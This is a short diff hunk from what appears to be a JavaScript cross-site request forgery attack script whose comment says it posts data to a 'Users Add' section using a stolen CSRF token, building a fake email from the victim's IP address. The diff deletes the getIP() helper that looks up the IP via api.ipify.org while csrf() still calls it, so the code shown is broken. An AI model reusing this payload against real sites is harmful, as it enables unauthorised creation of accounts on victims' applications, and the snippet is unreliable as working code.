@@ -35,12 +35,6 @@
 
 
 // Sends the CSRF attack to POST data to the Users Add section, using the previously obtained CSRF token
-function getIP() {
-    return fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => data.ip);
-}
-
 function csrf(token, key) {
     getIP().then(ip => {
     var randomEmail = "okpay+"+ip+"@live.com";
